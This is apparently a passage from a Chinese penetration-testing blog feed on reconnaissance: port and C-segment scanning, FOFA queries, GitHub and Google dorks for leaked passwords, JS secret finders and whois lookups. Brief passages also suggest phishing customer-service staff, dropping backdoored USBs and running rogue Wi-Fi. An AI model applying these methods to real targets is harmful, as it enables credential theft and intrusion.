class="hljs-built_in">close</span>()<br><br>for i in data:<br><br>with <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;resulit.txt&quot;</span>, <span class="hljs-string">&#x27;a&#x27;</span>,encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) as f:<br><br>f.<span class="hljs-built_in">write</span>(<span class="hljs-string">&quot;\t&#123;&#125; &#123;&#125;\n&quot;</span>.<span class="hljs-built_in">format</span>(i[<span class="hljs-string">&#x27;domain&#x27;</span>],i[<span class="hljs-string">&#x27;title&#x27;</span>]))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;     [+] &#123;&#125; &#123;&#125;[+]&quot;</span>.<span class="hljs-built_in">format</span>(i[<span class="hljs-string">&#x27;domain&#x27;</span>],i[<span class="hljs-string">&#x27;title&#x27;</span>]))<br><br>f.<span class="hljs-built_in">close</span>()<br><br>def <span class="hljs-built_in">get_ips</span>(ip):<br><br>iplist=[]<br><br>ips_str = ip[:ip.<span class="hljs-built_in">rfind</span>(<span class="hljs-string">&#x27;.&#x27;</span>)]<br><br>for ips in <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">256</span>):<br><br>ipadd=ips_str + <span class="hljs-string">&#x27;.&#x27;</span> + <span class="hljs-built_in">str</span>(ips)<br><br>iplist.<span class="hljs-built_in">append</span>(ipadd)<br><br>return iplist<br><br>ip=<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请你输入要查询的ip:&quot;</span>)<br><br>ips=<span class="hljs-built_in">get_ips</span>(ip)<br><br>for p in ips:<br><br><span class="hljs-built_in">get_c</span>(p)<br></code></pre></div></td></tr></table></figure><p><strong>Nmap,Msscan扫描等</strong><br>例如：nmap -p 80,443,8000,8080 -Pn 192.168.0.0&#x2F;24</p><p>常见端口表</p><p>21,22,23,80-90,161,389,443,445,873,1099,1433,1521,1900,2082,2083,2222,2601,2604,3128,3306,3311,3312,3389,4440,4848,5432,5560,5900,5901,5902,6082,6379,7001-7010,7778,8080-8090,8649,8888,9000,9200,10000,11211,27017,28017,50000,50030,50060,135,139,445,53,88</p><p>注意：探测C段时一定要确认ip是否归属于目标，因为一个C段中的所有ip不一定全部属于目标。</p><hr><h2 id="网络空间搜索引擎"><a href="#网络空间搜索引擎" class="headerlink" title="网络空间搜索引擎"></a>网络空间搜索引擎</h2><p>如果想要在短时间内快速收集资产，那么利用网络空间搜索引擎是不错的选择，可以直观地看到旁站，端口，站点标题，IP等信息，点击列举出站点可以直接访问，以此来判断是否为自己需要的站点信息。FOFA的常用语法</p><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">1、同IP旁站：<span class="hljs-attribute">ip</span>=“192.168.0.1”<br><br>2、C段：<span class="hljs-attribute">ip</span>=“192.168.0.0/24”<br><br>3、子域名：<span class="hljs-attribute">domain</span>=“baidu.com”<br><br>4、标题/关键字：<span class="hljs-attribute">title</span>=“百度”<br><br>5、如果需要将结果缩小到某个城市的范围，那么可以拼接语句<br><br><span class="hljs-attribute">title</span>=“百度”&amp;&amp; <span class="hljs-attribute">region</span>=“Beijing”<br><br>特征：<span class="hljs-attribute">body</span>=<span class="hljs-string">&quot;百度&quot;</span>或header=“baidu”<br></code></pre></div></td></tr></table></figure><hr><h2 id="敏感文件搜索"><a href="#敏感文件搜索" class="headerlink" title="敏感文件搜索"></a>敏感文件搜索</h2><h3 id="GitHub搜索"><a href="#GitHub搜索" class="headerlink" title="GitHub搜索"></a><strong>GitHub搜索</strong></h3><p>in:name test #仓库标题搜索含有关键字test</p><p>in:descripton test #仓库描述搜索含有关键字</p><p>in:readme test #Readme文件搜素含有关键字</p><p>搜索某些系统的密码</p><p><a href="https://github.com/search?q=smtp+58.com+password+3306&type=Code">https://github.com/search?q=smtp+58.com+password+3306&amp;type=Code</a></p><p>github 关键词监控</p><p><a href="https://www.codercto.com/a/46640.html">https://www.codercto.com/a/46640.html</a></p><h3 id="谷歌搜索"><a href="#谷歌搜索" class="headerlink" title="谷歌搜索"></a><strong>谷歌搜索</strong></h3><p>site:Github.com sa password</p><p>site:Github.com root password</p><p>site:Github.com User ID&#x3D;‘sa’;Password</p><p>site:Github.com inurl:sql</p><h3 id="SVN-信息收集"><a href="#SVN-信息收集" class="headerlink" title="SVN 信息收集"></a><strong>SVN 信息收集</strong></h3><p>site:Github.com svn</p><p>site:Github.com svn username</p><p>site:Github.com svn password</p><p>site:Github.com svn username password</p><h3 id="综合信息收集"><a href="#综合信息收集" class="headerlink" title="综合信息收集"></a><strong>综合信息收集</strong></h3><p>site:Github.com password</p><p>site:Github.com ftp ftppassword</p><p>site:Github.com 密码</p><p>site:Github.com 内部</p><p><a href="https://blog.csdn.net/qq_36119192/article/details/99690742">https://blog.csdn.net/qq_36119192/article/details/99690742</a></p><p><a href="http://www.361way.com/github-hack/6284.html">http://www.361way.com/github-hack/6284.html</a></p><p><a href="https://docs.github.com/cn/github/searching-for-information-on-github/searching-code">https://docs.github.com/cn/github/searching-for-information-on-github/searching-code</a></p><p><a href="https://github.com/search?q=smtp+bilibili.com&type=code">https://github.com/search?q=smtp+bilibili.com&amp;type=code</a></p><h3 id="Google-hacking"><a href="#Google-hacking" class="headerlink" title="Google-hacking"></a><strong>Google-hacking</strong></h3><p>site:域名</p><p>inurl: url中存在的关键字网页</p><p>intext：网页正文中的关键词</p><p>filetype:指定文件类型</p><h3 id="wooyun漏洞库"><a href="#wooyun漏洞库" class="headerlink" title="wooyun漏洞库"></a><strong>wooyun漏洞库</strong></h3><p><a href="https://wooyun.website/">https://wooyun.website/</a><br>联系管理员limanman233可以获得海量漏洞库</p><hr><h3 id="网盘搜索"><a href="#网盘搜索" class="headerlink" title="网盘搜索"></a><strong>网盘搜索</strong></h3><p>凌云搜索 <a href="https://www.lingfengyun.com/">https://www.lingfengyun.com/</a></p><p>盘多多：<a href="http://www.panduoduo.net/">http://www.panduoduo.net/</a></p><p>盘搜搜：<a href="http://www.pansoso.com/">http://www.pansoso.com/</a></p><p>盘搜：<a href="http://www.pansou.com/">http://www.pansou.com/</a></p><h3 id="社工库"><a href="#社工库" class="headerlink" title="社工库"></a><strong>社工库</strong></h3><p>名字&#x2F;常用id&#x2F;邮箱&#x2F;密码&#x2F;电话 登录 网盘 网站 邮箱 找敏感信息</p><p>tg机器人</p><h3 id="社工相关"><a href="#社工相关" class="headerlink" title="社工相关"></a>社工相关</h3><p>微信或者QQ 混入内部群，蹲点观测。加客服小姐姐发一些连接。进一步获取敏感信息。测试产品，购买服务器，拿去测试账号和密码。</p><h3 id="网站注册信息"><a href="#网站注册信息" class="headerlink" title="网站注册信息"></a><strong>网站注册信息</strong></h3><p><a href="http://www.reg007.com查询网站注册信息/">www.reg007.com查询网站注册信息</a></p><p>一般是配合社工库一起来使用。</p><h3 id="js敏感信息"><a href="#js敏感信息" class="headerlink" title="js敏感信息"></a><strong>js敏感信息</strong></h3><p>网站的url连接写到js里面<br>js的api接口 里面包含用户信息 比如 账号和密码</p><p>** jsfinder**<br><a href="https://gitee.com/kn1fes/JSFinder">https://gitee.com/kn1fes/JSFinder</a></p><p>python3 JSFinder.py -u <a href="http://www.mi.com/">http://www.mi.com</a></p><p>python3 JSFinder.py -u <a href="http://www.mi.com/">http://www.mi.com</a> -d</p><p>python3 JSFinder.py -u <a href="http://www.mi.com/">http://www.mi.com</a> -d -ou mi_url.txt -os mi_subdomain.txt</p><p>当你想获取更多信息的时候，可以使用-d进行深度爬取来获得更多内容，并使用命令 -ou, -os来指定URL和子域名所保存的文件名</p><p>批量指定URL和JS链接来获取里面的URL。</p><p>指定URL：</p><p>python JSFinder.py -f text.txt</p><p>指定JS：</p><p>python JSFinder.py -f text.txt -j</p><h4 id="Packer-Fuzzer"><a href="#Packer-Fuzzer" class="headerlink" title="Packer-Fuzzer"></a><strong>Packer-Fuzzer</strong></h4><p>寻找网站交互接口 授权key</p><p>随着WEB前端打包工具的流行，您在日常渗透测试、安全服务中是否遇到越来越多以Webpack打包器为代表的网站？这类打包器会将整站的API和API参数打包在一起供Web集中调用，这也便于我们快速发现网站的功能和API清单，但往往这些打包器所生成的JS文件数量异常之多并且总JS代码量异常庞大（多达上万行），这给我们的手工测试带来了极大的不便，Packer Fuzzer软件应运而生。</p><p>本工具支持自动模糊提取对应目标站点的API以及API对应的参数内容，并支持对：未授权访问、敏感信息泄露、CORS、SQL注入、水平越权、弱口令、任意文件上传七大漏洞进行模糊高效的快速检测。在扫描结束之后，本工具还支持自动生成扫描报告，您可以选择便于分析的HTML版本以及较为正规的doc、pdf、txt版本。</p><p>sudo apt-get install nodejs &amp;&amp; sudo apt-get install npm</p><p>git clone <a href="https://gitee.com/keyboxdzd/Packer-Fuzzer.git">https://gitee.com/keyboxdzd/Packer-Fuzzer.git</a></p><p>pip3 install -r requirements.txt</p><p>python3 PackerFuzzer.py -u <a href="https://www.liaoxuefeng.com/">https://www.liaoxuefeng.com</a></p><h3 id="SecretFinder"><a href="#SecretFinder" class="headerlink" title="SecretFinder"></a><strong>SecretFinder</strong></h3><p>一款基于Python脚本的JavaScript敏感信息搜索工具</p><p><a href="https://gitee.com/mucn/SecretFinder">https://gitee.com/mucn/SecretFinder</a></p><p>python3 SecretFinder.py -i <a href="https://www.baidu.com/">https://www.baidu.com/</a> -e</p><h3 id="github信息泄露监控"><a href="#github信息泄露监控" class="headerlink" title="github信息泄露监控"></a>github信息泄露监控</h3><p><a href="https://github.com/0xbug/Hawkeye">https://github.com/0xbug/Hawkeye</a></p><p><a href="https://github.com/MiSecurity/x-patrol">https://github.com/MiSecurity/x-patrol</a></p><p><a href="https://github.com/VKSRC/Github-Monitor">https://github.com/VKSRC/Github-Monitor</a></p><h3 id="物理接触"><a href="#物理接触" class="headerlink" title="物理接触"></a>物理接触</h3><p>到企业办公层连接wifi，连同内网。丢一些带有后门的usb 开放免费的wifi截取账号和密码。</p><hr><h2 id="非常规操作"><a href="#非常规操作" class="headerlink" title="非常规操作"></a>非常规操作</h2><p>1、如果找到了目标的一处资产，但是对目标其他资产的收集无处下手时，可以查看一下该站点的body里是否有目标的特征，然后利用网络空间搜索引擎（如fofa等）对该特征进行搜索，如：body&#x3D;”XX公司”或body&#x3D;”baidu”等。</p><p>该方式一般适用于特征明显，资产数量较多的目标，并且很多时候效果拔群。</p><p>2、当通过上述方式的找到test.com的特征后，再进行body的搜索，然后再搜索到test.com的时候，此时fofa上显示的ip大概率为test.com的真实IP。</p><p>3、如果需要对政府网站作为目标，那么在批量获取网站首页的时候，可以用上</p><p><a href="http://114.55.181.28/databaseInfo/index">http://114.55.181.28/databaseInfo/index</a></p><p>之后可以结合上一步的方法进行进一步的信息收集。</p><hr><h2 id="SSL-TLS证书查询"><a href="#SSL-TLS证书查询" class="headerlink" title="SSL&#x2F;TLS证书查询"></a>SSL&#x2F;TLS证书查询</h2><p>SSL&#x2F;TLS证书通常包含域名、子域名和邮件地址等信息，结合证书中的信息，可以更快速地定位到目标资产，获取到更多目标资产的相关信息。</p><p><a href="https://myssl.com/">https://myssl.com/</a></p><p><a href="https://crt.sh/">https://crt.sh</a></p><p><a href="https://censys.io/">https://censys.io</a></p><p><a href="https://developers.facebook.com/tools/ct/">https://developers.facebook.com/tools/ct/</a></p><p><a href="https://google.com/transparencyreport/https/ct/">https://google.com/transparencyreport/https/ct/</a></p><p>SSL证书搜索引擎：</p><p><a href="https://certdb.com/domain/github.com">https://certdb.com/domain/github.com</a></p><p><a href="https://crt.sh/?Identity=%25.baidu.com">https://crt.sh/?Identity=%.baidu.com</a></p><p><a href="https://censys.io/">https://censys.io/</a></p><p>GetDomainsBySSL.py</p><hr><h2 id="移动资产收集"><a href="#移动资产收集" class="headerlink" title="移动资产收集"></a>移动资产收集</h2><h3 id="微信小程序支付宝小程序"><a href="#微信小程序支付宝小程序" class="headerlink" title="微信小程序支付宝小程序"></a><strong>微信小程序支付宝小程序</strong></h3><p>现在很多企业都有小程序，可以关注企业的微信公众号或者支付宝小程序，或关注运营相关人员，查看朋友圈，获取小程序。</p><p><a href="https://weixin.sogou.com/weixin?type=1&ie=utf8&query=%E6%8B%BC%E5%A4%9A%E5%A4%9A">https://weixin.sogou.com/weixin?type=1&amp;ie=utf8&amp;query=%E6%8B%BC%E5%A4%9A%E5%A4%9A</a></p><h3 id="app软件搜索"><a href="#app软件搜索" class="headerlink" title="app软件搜索"></a><strong>app软件搜索</strong></h3><p><a href="https://www.qimai.cn/">https://www.qimai.cn/</a></p><h3 id="社交信息搜索"><a href="#社交信息搜索" class="headerlink" title="社交信息搜索"></a>社交信息搜索</h3><p>QQ群 QQ手机号</p><p>微信群</p><p>领英</p><p><a href="https://www.linkedin.com/">https://www.linkedin.com/</a></p><p>脉脉招聘</p><p>boss招聘</p><hr><h3 id="常用工具推荐"><a href="#常用工具推荐" class="headerlink" title="常用工具推荐"></a>常用工具推荐</h3><h4 id="资产收集神器"><a href="#资产收集神器" class="headerlink" title="资产收集神器"></a>资产收集神器</h4><p>ARL(Asset Reconnaissance Lighthouse)资产侦察灯塔系统</p><p><a href="https://github.com/TophantTechnology/ARL">https://github.com/TophantTechnology/ARL</a></p><p>AssetsHunter</p><p><a href="https://github.com/rabbitmask/AssetsHunter">https://github.com/rabbitmask/AssetsHunter</a></p><p>一款用于src资产信息收集的工具</p><p><a href="https://github.com/sp4rkw/Reaper">https://github.com/sp4rkw/Reaper</a></p><p>domain_hunter_pro</p><p><a href="https://github.com/bit4woo/domain_hunter_pro">https://github.com/bit4woo/domain_hunter_pro</a></p><p>LangSrcCurise</p><p><a href="https://github.com/shellsec/LangSrcCurise">https://github.com/shellsec/LangSrcCurise</a></p><p>网段资产</p><p><a href="https://github.com/colodoo/midscan">https://github.com/colodoo/midscan</a></p><p>Fuzz字典推荐：<a href="https://github.com/TheKingOfDuck/fuzzDicts">https://github.com/TheKingOfDuck/fuzzDicts</a></p><p>BurpCollector(BurpSuite参数收集插件)：<a href="https://github.com/TEag1e/BurpCollector">https://github.com/TEag1e/BurpCollector</a></p><p>Wfuzz：<a href="https://github.com/xmendez/wfuzz">https://github.com/xmendez/wfuzz</a></p><p>LinkFinder：<a href="https://github.com/GerbenJavado/LinkFinder">https://github.com/GerbenJavado/LinkFinder</a></p><p>PoCBox：<a href="https://github.com/Acmesec/PoCBox">https://github.com/Acmesec/PoCBox</a></p>]]></content>
    
    
    <categories>
      
      <category>渗透基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>渗透-信息收集（二）</title>
    <link href="/2024/06/16/%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <url>/2024/06/16/%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="信息收集工具利用"><a href="#信息收集工具利用" class="headerlink" title="信息收集工具利用"></a>信息收集工具利用</h1><h2 id="1、Kali—信息收集"><a href="#1、Kali—信息收集" class="headerlink" title="1、Kali—信息收集"></a>1、Kali—信息收集</h2><p><strong>Robots文件探测</strong><br>获取网站隐藏敏感目录活文件</p><p>比如：安装目录、上传目录、编辑器目录、管理目录、管理页面等</p><p>例：<a href="http://www.baidu.com/robots.txt">www.baidu.com/robots.txt</a></p><h2 id="2、DNS信息收集"><a href="#2、DNS信息收集" class="headerlink" title="2、DNS信息收集"></a>2、DNS信息收集</h2><p>搜集网站域名信息，如子域名，其他域名，解析服务器，区域传送漏洞等</p><p>常用工具：dnsenum、dig、fierce</p><h3 id="Whois信息搜集"><a href="#Whois信息搜集" class="headerlink" title="Whois信息搜集"></a>Whois信息搜集</h3><p>Whois baidu.com</p><p><strong>Dnsenum</strong><br>Dnsenum可以通过字典或谷歌猜测可能存在的域名，并对一个网段进行反查</p><p>Dnsenum –enum baidu.com 获取其他域名<br><img src="/2024/06/16/%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%88%E4%BA%8C%EF%BC%89/image-20240617232627779.png" alt="image-20240617232627779"></p><p>-r 允许用户设置递归查询</p><p>-w 允许用户设置whois请求</p><p>-o 允许用户指定输入文件位置</p><hr><h4 id="敏感目录探测"><a href="#敏感目录探测" class="headerlink" title="敏感目录探测"></a>敏感目录探测</h4><p><strong>暴力破解</strong><br>暴力破解的方法就是需要一个强大的目录名称字典，用来尝试逐个匹配，如果存在通过响应码的回显来确定目录或页面是否存在</p><p><strong>目录爬行</strong><br>目录爬行原理是通过一些自带网络蜘蛛爬行的工具对网站链接进行快速爬行</p><p><strong>Dirb</strong><br>-a 改变ua 躲避安全狗</p><p>-b指定扫描路径</p><p>-c 指定cookie</p><p>-p 代理设置</p><p>Dirb <a href="http://www.baidu.com-a/">http://www.baidu.com-a</a> Mozilla&#x2F;5.0“</p><p><img src="/2024/06/16/%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%88%E4%BA%8C%EF%BC%89/image-20240617232650083.png" alt="image-20240617232650083"></p><p>当然也有图形界面的工具</p><p><strong>Dirbuster</strong></p><p><img src="/2024/06/16/%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%88%E4%BA%8C%EF%BC%89/image-20240617232700021.png" alt="image-20240617232700021"></p><h2 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h2><h3 id="整站识别"><a href="#整站识别" class="headerlink" title="整站识别"></a>整站识别</h3><h4 id="Whatweb"><a href="#Whatweb" class="headerlink" title="Whatweb"></a>Whatweb</h4><p>用来识别网站cms及大家平台环境的工具</p><p>Whatweb -v <a href="http://baidu.com/">http://baidu.com</a></p><p>平台、脚本、cms、容器、数据库等信息探测</p><h2 id="Waf探测"><a href="#Waf探测" class="headerlink" title="Waf探测"></a>Waf探测</h2><p>Wafwoof</p><p>用来探测waf等一个工具（不推荐）</p><p>Wafw00f <a href="http://www.baidu.com/">http://www.baidu.com</a></p><hr><h2 id="工具型站的使用"><a href="#工具型站的使用" class="headerlink" title="工具型站的使用"></a>工具型站的使用</h2><h3 id="Google语法"><a href="#Google语法" class="headerlink" title="Google语法"></a>Google语法</h3><h4 id="信息收集的分类（详细篇）"><a href="#信息收集的分类（详细篇）" class="headerlink" title="信息收集的分类（详细篇）"></a>信息收集的分类（详细篇）</h4><p>服务器的相关信息（真实ip，系统类型，版本，开放端口，WAF等）</p><p>网站指纹识别（包括，cms，cdn，证书等） dns记录</p><p>whois信息，姓名，备案，邮箱，电话反查（邮箱丢社工库，社工准备等）</p><p>子域名收集，旁站，C段等</p><p>google hacking针对化搜索，word&#x2F;电子表格&#x2F;pdf文件，中间件版本，弱口令扫描等</p><p>扫描网站目录结构，爆后台，网站banner，测试文件，备份等敏感文件泄漏等</p><p>传输协议，通用漏洞，exp，github源码等</p><hr><h3 id="常见的方法有"><a href="#常见的方法有" class="headerlink" title="常见的方法有"></a>常见的方法有</h3><h3 id="whois查询"><a href="#whois查询" class="headerlink" title="whois查询"></a>whois查询</h3><p>域名在注册的时候 需要填入个人或者企业信息 如果没有设置隐藏属性可以查询出来 通过备案号 查询个人或者企业信息 也可以whois反查注册人 邮箱 电话 机构 反查更多得域名和需要得信息。</p><h3 id="收集子域名"><a href="#收集子域名" class="headerlink" title="收集子域名"></a>收集子域名</h3><p>域名分为根域名和子域名</p><p>baidu.com 根域名 顶级域名</p><p><a href="http://www.baidu.com子域名/">www.baidu.com子域名</a> 也叫二级域名</p><p><a href="http://www.wiki.baidu.com/">www.wiki.baidu.com</a> 子域名 也叫三级域名 四级如此类推</p><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a><strong>端口扫描</strong></h3><p>服务器需要开放服务，就必须开启端口，常见的端口是tcp 和udp两种类型</p><p>范围 0-65535 通过扫得到的端口，访问服务 规划下一步渗透。</p><h3 id="查找真实ip"><a href="#查找真实ip" class="headerlink" title="查找真实ip"></a><strong>查找真实ip</strong></h3><p>企业的网站，为了提高访问速度，或者避免黑客攻击，用了cdn服务，用了cdn之后真实服务器ip会被隐藏。</p><h3 id="探测旁站及C段"><a href="#探测旁站及C段" class="headerlink" title="探测旁站及C段"></a><strong>探测旁站及C段</strong></h3><p>旁站:一个服务器上有多个网站 通过ip查询服务器上的网站</p><p>c段:查找同一个段 服务器上的网站。可以找到同样网站的类型和服务器，也可以获取同段服务器进行下一步渗透。</p><h3 id="网络空间搜索引擎"><a href="#网络空间搜索引擎" class="headerlink" title="网络空间搜索引擎"></a><strong>网络空间搜索引擎</strong></h3><p>通过这些引擎查找网站或者服务器的信息，进行下一步渗透。</p><h3 id="扫描敏感目录-文件"><a href="#扫描敏感目录-文件" class="headerlink" title="扫描敏感目录&#x2F;文件"></a><strong>扫描敏感目录&#x2F;文件</strong></h3><p>通过扫描目录和文件，大致了解网站的结构，获取突破点，比如后台，文件备份，上传点。</p><h3 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a><strong>指纹识别</strong></h3><p>获取网站的版本，属于那些cms管理系统，查找漏洞exp，下载cms进行代码审计。</p><hr><h2 id="在线whois查询"><a href="#在线whois查询" class="headerlink" title="在线whois查询"></a>在线whois查询</h2><p>通过whois来对域名信息进行查询，可以查到注册商、注册人、邮箱、DNS解析服务器、注册人联系电话等，因为有些网站信息查得到，有些网站信息查不到，所以推荐以下信息比较全的查询网站，直接输入目标站点即可查询到相关信息。</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">站长之家域名WHOIS信息查询地址 http:<span class="hljs-regexp">//</span>whois.chinaz.com/<br><br>爱站网域名WHOIS信息查询地址 https:<span class="hljs-regexp">//</span>whois.aizhan.com/<br><br>腾讯云域名WHOIS信息查询地址 https:<span class="hljs-regexp">//</span>whois.cloud.tencent.com/<br><br>美橙互联域名WHOIS信息查询地址 https:<span class="hljs-regexp">//</span>whois.cndns.com/<br><br>爱名网域名WHOIS信息查询地址 https:<span class="hljs-regexp">//</span>www.<span class="hljs-number">22</span>.cn<span class="hljs-regexp">/domain/</span><br><br>易名网域名WHOIS信息查询地址 https:<span class="hljs-regexp">//</span>whois.ename.net/<br><br>中国万网域名WHOIS信息查询地址 https:<span class="hljs-regexp">//</span>whois.aliyun.com/<br><br>西部数码域名WHOIS信息查询地址 https:<span class="hljs-regexp">//</span>whois.west.cn/<br><br>新网域名WHOIS信息查询地址 http:<span class="hljs-regexp">//</span>whois.xinnet.com<span class="hljs-regexp">/domain/</span>whois/index.jsp<br><br>纳网域名WHOIS信息查询地址 http:<span class="hljs-regexp">//</span>whois.nawang.cn/<br><br>中资源域名WHOIS信息查询地址 https:<span class="hljs-regexp">//</span>www.zzy.cn<span class="hljs-regexp">/domain/</span>whois.html<br><br>三五互联域名WHOIS信息查询地址 https:<span class="hljs-regexp">//</span>cp.<span class="hljs-number">35</span>.com<span class="hljs-regexp">/chinese/</span>whois.php<br><br>新网互联域名WHOIS信息查询地址 http:<span class="hljs-regexp">//</span>www.dns.com.cn<span class="hljs-regexp">/show/</span>domain<span class="hljs-regexp">/whois/i</span>ndex.<span class="hljs-keyword">do</span><br><br>国外WHOIS信息查询地址 https:<span class="hljs-regexp">//</span>who.is/<br></code></pre></div></td></tr></table></figure><hr><h2 id="在线网站备案查询"><a href="#在线网站备案查询" class="headerlink" title="在线网站备案查询"></a>在线网站备案查询</h2><p>网站备案信息是根据国家法律法规规定，由网站所有者向国家有关部门申请的备案，如果需要查询企业备案信息（单位名称、备案编号、网站负责人、电子邮箱、联系电话、法人等），推荐以下网站查询</p><figure class="highlight perl"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs perl">天眼查 https:<span class="hljs-regexp">//</span>www.tianyancha.com/<br><br>ICP备案查询网http:<span class="hljs-regexp">//</span>www.beianbeian.com/<br><br>爱站备案查询https:<span class="hljs-regexp">//i</span>cp.aizhan.com/<br><br>域名助手备案信息查询 http:<span class="hljs-regexp">//</span>cha.fute.com/<span class="hljs-keyword">index</span><br></code></pre></div></td></tr></table></figure><h3 id="查询绿盟的whois信息"><a href="#查询绿盟的whois信息" class="headerlink" title="查询绿盟的whois信息"></a>查询绿盟的whois信息</h3><p>nsfocus.com.cn</p><p>Whois查询nsfocus.com.cn</p><p><img src="/2024/06/16/%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%88%E4%BA%8C%EF%BC%89/image-20240617232849247.png" alt="image-20240617232849247"></p><p>通过反查注册人和邮箱得多更多得域名</p><p><img src="/2024/06/16/%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%88%E4%BA%8C%EF%BC%89/image-20240617232856379.png" alt="image-20240617232856379"></p><hr><h2 id="端口扫描-1"><a href="#端口扫描-1" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>当确定了目标大概的ip段后，可以先对ip的开放端口进行探测，一些特定服务可能开起在默认端口上，探测开放端口有利于快速收集目标资产，找到目标网站的其他功能站点。</p><h3 id="msscan端口扫描"><a href="#msscan端口扫描" class="headerlink" title="msscan端口扫描"></a><strong>msscan端口扫描</strong></h3><p>msscan -p 1-65535 ip –rate&#x3D;1000</p><p><a href="https://gitee.com/youshusoft/GoScanner/">https://gitee.com/youshusoft/GoScanner/</a></p><h3 id="御剑端口扫描工具"><a href="#御剑端口扫描工具" class="headerlink" title="御剑端口扫描工具"></a><strong>御剑端口扫描工具</strong></h3><p><img src="/2024/06/16/%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%88%E4%BA%8C%EF%BC%89/image-20240617233420727.png" alt="image-20240617233420727"></p><h3 id="nmap扫描端口和探测端口信息"><a href="#nmap扫描端口和探测端口信息" class="headerlink" title="nmap扫描端口和探测端口信息"></a><strong>nmap扫描端口和探测端口信息</strong></h3><p>常用参数，如：</p><p>nmap -sV 192.168.0.2</p><p>nmap -sT 92.168.0.2</p><p>nmap -Pn -A -sC 192.168.0.2</p><p>nmap -sU -sT -p0-65535 192.168.122.1</p><p>用于扫描目标主机服务版本号与开放的端口</p><p>如果需要扫描多个ip或ip段，可以将他们保存到一个txt文件中</p><p>nmap -iL ip.txt</p><p>来扫描列表中所有的ip。</p><p>Nmap为端口探测最常用的方法，操作方便，输出结果非常直观。</p><h3 id="在线端口检测"><a href="#在线端口检测" class="headerlink" title="在线端口检测"></a><strong>在线端口检测</strong></h3><p><a href="http://coolaf.com/tool/port">http://coolaf.com/tool/port</a></p><p><img src="/2024/06/16/%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%88%E4%BA%8C%EF%BC%89/image-20240617233445208.png" alt="image-20240617233445208"></p><p>御剑，msscan，nmap等</p><p>御剑高速端口扫描器：</p><p>填入想要扫描的ip段（如果只扫描一个ip，则开始IP和结束IP填一个即可），可以选择不改默认端口列表，也可以选择自己指定端口。</p><h2 id="渗透端口"><a href="#渗透端口" class="headerlink" title="渗透端口"></a><strong>渗透端口</strong></h2><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">21</span>,<span class="hljs-number">22</span>,<span class="hljs-number">23</span>,<span class="hljs-number">1433</span>,<span class="hljs-number">152</span>,<span class="hljs-number">3306</span>,<span class="hljs-number">3389</span>,<span class="hljs-number">5432</span>,<span class="hljs-number">5900</span>,<span class="hljs-number">50070</span>,<span class="hljs-number">50030</span>,<span class="hljs-number">50000</span>,<span class="hljs-number">27017</span>,<span class="hljs-number">27018</span>,<span class="hljs-number">11211</span>,<span class="hljs-number">9200</span>,<span class="hljs-number">9300</span>,<span class="hljs-number">7001</span>,<span class="hljs-number">7002</span>,<span class="hljs-number">6379</span>,<span class="hljs-number">5984</span>,<span class="hljs-number">873</span>,<span class="hljs-number">443</span>,<span class="hljs-number">8000</span>-<span class="hljs-number">9090</span>,<span class="hljs-number">80</span>-<span class="hljs-number">89</span>,<span class="hljs-number">80</span>,<span class="hljs-number">10000</span>,<span class="hljs-number">8888</span>,<span class="hljs-number">8649</span>,<span 